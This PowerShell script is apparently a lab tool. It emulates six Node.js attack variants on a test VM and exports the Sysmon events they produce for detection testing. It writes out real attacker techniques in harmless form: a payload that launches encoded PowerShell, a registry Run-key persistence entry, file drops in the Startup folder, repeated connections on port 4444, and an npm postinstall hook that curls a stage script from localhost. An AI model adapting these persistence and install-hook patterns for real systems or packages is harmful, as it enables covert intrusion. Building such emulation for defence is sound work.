<#
  mtdf_node_variants.ps1 - harmless emulation of Node.js attack VARIANTS (V1-V6). LAB VM ONLY.
      powershell -ExecutionPolicy Bypass -File mtdf_node_variants.ps1        (about 3 minutes)

  V1 Renamed runtime   a copy of node.exe named update.exe runs payload.js from Downloads\mtdf-variant
  V2 Non-web-port C2   6 TCP connections, 15 s apart, to portquiz.net:4444 (a public test service
                       that accepts any port); nothing is sent
  V3 Run-key persist.  HKCU Run value MTDFUpdater -> update.exe payload.js  (removed at the end)
  V4 File drops        mtdf_test.cmd in the Startup folder (contains only "exit /b 0") and a .ps1 in
                       %TEMP% (contains only Write-Output)  (both removed at the end)
  V5 npm postinstall   a local package whose postinstall runs curl against 127.0.0.1:9 (nothing listens)
  V6 Electron as node  a copy of node.exe named Code.exe runs main.js from %TEMP%\mtdf-electron
  Then it exports every Sysmon event of the run to node_variants_capture.json and cleans up.
  Needs: Node.js (with npm), Sysmon with lab\sysmonconfig-mtdf-lab.xml, internet for V2.
#>
$ErrorActionPreference = "Stop"
if (-not (Get-Service -Name Sysmon* -ErrorAction SilentlyContinue)) { Write-Host "Sysmon is not installed." -ForegroundColor Red; exit 1 }
$node = (Get-Command node -ErrorAction SilentlyContinue).Source
if (-not $node) { Write-Host "Node.js not found - open a NEW PowerShell after installing it." -ForegroundColor Red; exit 1 }
$start = (Get-Date).AddSeconds(-5)

$v   = Join-Path $env:USERPROFILE "Downloads\mtdf-variant"
$el  = Join-Path $env:TEMP "mtdf-electron"
$npmDir = Join-Path $env:TEMP "mtdf-npm"
foreach ($d in $v, $el, "$npmDir\pkg", "$npmDir\app") { New-Item -ItemType Directory -Force -Path $d | Out-Null }
Copy-Item $node (Join-Path $v "update.exe") -Force
Copy-Item $node (Join-Path $el "Code.exe") -Force

@'
// MTDF variant payload - harmless. See mtdf_node_variants.ps1.
const { exec } = require('child_process');
const net = require('net'), fs = require('fs'), path = require('path'), os = require('os');
const run = cmd => new Promise(done => { console.log('starting:', cmd.slice(0, 70));
  try { exec(cmd, { timeout: 30000, windowsHide: true }, () => done()); }
  catch (e) { console.log('   BLOCKED (' + e.code + ') - antivirus or policy refused the process; carrying on'); done(); } });
const sleep = ms => new Promise(r => setTimeout(r, ms));
const knock = () => new Promise(done => {
  const s = net.connect({ host: 'portquiz.net', port: 4444 }, () => { s.end(); done(); });
  s.setTimeout(8000, () => { s.destroy(); done(); }); s.on('error', () => done());
});
(async () => {
  const me = process.execPath, script = __filename;
  await run('powershell -NoProfile -e dwBoAG8AYQBtAGkA');                       // V1: child of a renamed runtime
  await run(`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MTDFUpdater /t REG_SZ /d "\\"${me}\\" \\"${script}\\"" /f`);  // V3
  const startup = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'mtdf_test.cmd');
  try { fs.writeFileSync(startup, '@echo off\r\nexit /b 0\r\n'); } catch (e) { console.log('   BLOCKED Startup write'); }   // V4
  const stage = path.join(os.tmpdir(), 'mtdf-variant-stage.ps1');
  try { fs.writeFileSync(stage, 'Write-Output "MTDF lab"\r\n'); } catch (e) { console.log('   BLOCKED stage write'); }    // V4
  for (let i = 1; i <= 6; i++) { await knock(); console.log('V2 knock', i, 'of 6'); await sleep(15000); }   // V2
  await run('reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MTDFUpdater /f');       // cleanup
  try { fs.unlinkSync(startup); } catch (e) {}
  try { fs.unlinkSync(stage); } catch (e) {}
})();
'@ | Set-Content -Path (Join-Path $v "payload.js") -Encoding utf8

"require('child_process').exec('whoami', () => {});" | Set-Content -Path (Join-Path $el "main.js") -Encoding utf8

@'
{ "name": "mtdf-lab-postinstall", "version": "1.0.0", "description": "MTDF lab: harmless postinstall",
  "scripts": { "postinstall": "curl -s -o %TEMP%\\mtdf-stage.sh http://127.0.0.1:9/stage.sh" } }
'@ | Set-Content -Path "$npmDir\pkg\package.json" -Encoding ascii

Write-Host "V1-V4: renamed runtime from Downloads (about 2 minutes)..." -ForegroundColor Cyan
& (Join-Path $v "update.exe") (Join-Path $v "payload.js")
Write-Host "V5: npm install of a package with a postinstall script..." -ForegroundColor Cyan
Push-Location "$npmDir\pkg"; npm pack --silent | Out-Null; Pop-Location
Push-Location "$npmDir\app"; npm init -y | Out-Null; npm install "$npmDir\pkg\mtdf-lab-postinstall-1.0.0.tgz" 2>&1 | Out-Null; Pop-Location
Write-Host "V6: Electron app binary run as node..." -ForegroundColor Cyan
& (Join-Path $el "Code.exe") (Join-Path $el "main.js")
Start-Sleep -Seconds 5

$filter = @{ LogName = 'Microsoft-Windows-Sysmon/Operational'; StartTime = $start; EndTime = (Get-Date); Id = 1, 3, 11, 12, 13, 22 }
$rows = Get-WinEvent -FilterHashtable $filter -ErrorAction SilentlyContinue | ForEach-Object {
    $x = [xml]$_.ToXml(); $data = [ordered]@{}
    foreach ($e in $x.Event.EventData.Data) { $data[$e.Name] = $e.'#text' }
    [pscustomobject]@{ EventId = [int]$_.Id; TimeCreated = $_.TimeCreated.ToUniversalTime().ToString('o')
                       Computer = $_.MachineName; RecordId = $_.RecordId; EventData = $data }
}
$arr = @($rows)
$out = Join-Path $PSScriptRoot "node_variants_capture.json"
Set-Content -Path $out -Value $(if ($arr.Count) { ConvertTo-Json -InputObject $arr -Depth 8 } else { '[]' }) -Encoding utf8
Remove-Item $v, $el, $npmDir -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ("Exported {0} Sysmon events -> {1}" -f $arr.Count, $out) -ForegroundColor Green
$check = [ordered]@{
  "V1 renamed runtime started"  = @($arr | Where-Object { $_.EventId -eq 1 -and $_.EventData.Image -like '*mtdf-variant\update.exe' }).Count
  "V2 connections on port 4444" = @($arr | Where-Object { $_.EventId -eq 3 -and $_.EventData.DestinationPort -eq '4444' }).Count
  "V3 Run value set"            = @($arr | Where-Object { $_.EventId -eq 13 -and $_.EventData.TargetObject -like '*\Run\MTDFUpdater' }).Count
  "V4 files dropped"            = @($arr | Where-Object { $_.EventId -eq 11 -and $_.EventData.TargetFilename -match 'mtdf_test\.cmd|mtdf-variant-stage\.ps1' }).Count
  "V5 postinstall curl"         = @($arr | Where-Object { $_.EventId -eq 1 -and $_.EventData.CommandLine -like '*127.0.0.1:9/stage.sh*' }).Count
  "V6 Code.exe run as node"     = @($arr | Where-Object { $_.EventId -eq 1 -and $_.EventData.Image -like '*mtdf-electron\Code.exe' }).Count
}
foreach ($k in $check.Keys) { $c = $check[$k]; Write-Host ("  {0,-30} {1}" -f $k, $c) -ForegroundColor $(if ($c) { 'Gray' } else { 'Yellow' }) }
if ($check.Values -contains 0) { Write-Host "  A variant with 0 events did not run or was not logged - send this output to Claude." -ForegroundColor Yellow }
